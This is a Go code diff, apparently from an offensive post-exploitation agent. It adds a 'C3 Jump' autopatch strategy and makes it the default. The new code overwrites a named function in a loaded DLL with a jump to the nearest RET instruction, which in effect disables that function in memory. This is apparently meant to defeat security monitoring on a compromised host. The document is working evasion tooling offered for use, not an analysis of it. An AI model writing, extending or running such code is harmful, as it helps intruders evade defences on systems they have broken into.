@@ -112,6 +112,10 @@ func autopatchTarget(targetName, strategy string) structs.CommandResult {
 		return errorf("Unknown target: %s", targetName)
 	}
 
+	if strategy == "" || strategy == "c3-jump" {
+		return autopatchC3Target(target)
+	}
+
 	output, err := PatchTarget(target, strategy)
 	if err != nil {
 		return errorf("patching target '%s': %v", targetName, err)
@@ -123,14 +127,35 @@ func autopatchTarget(targetName, strategy string) structs.CommandResult {
 func autopatchAll(strategy string) structs.CommandResult {
 	var results []string
 	for name, target := range knownTargets {
-		output, err := PatchTarget(target, strategy)
-		if err != nil {
-			results = append(results, fmt.Sprintf("[!] %s: %v", name, err))
+		var output string
+		var err error
+		if strategy == "" || strategy == "c3-jump" {
+			result := autopatchC3Target(target)
+			if result.Status == "error" {
+				results = append(results, fmt.Sprintf("[!] %s: %s", name, result.Output))
+				continue
+			}
+			output = result.Output
 		} else {
-			results = append(results, output)
+			output, err = PatchTarget(target, strategy)
+			if err != nil {
+				results = append(results, fmt.Sprintf("[!] %s: %v", name, err))
+				continue
+			}
 		}
+		results = append(results, output)
 	}
 	return successResult(strings.Join(results, "\n---\n"))
+}
+
+// autopatchC3Target applies the C3 Jump technique to a known target.
+// Searches for the nearest C3 (RET) instruction and writes a JMP to it.
+func autopatchC3Target(target knownTarget) structs.CommandResult {
+	output, err := PerformAutoPatch(target.DLL, target.Function, 300)
+	if err != nil {
+		return errorf("C3 Jump patch %s!%s: %v", target.DLL, target.Function, err)
+	}
+	return successResult(output)
 }
 
 // PerformAutoPatch applies a jump-to-ret patch on the specified function.
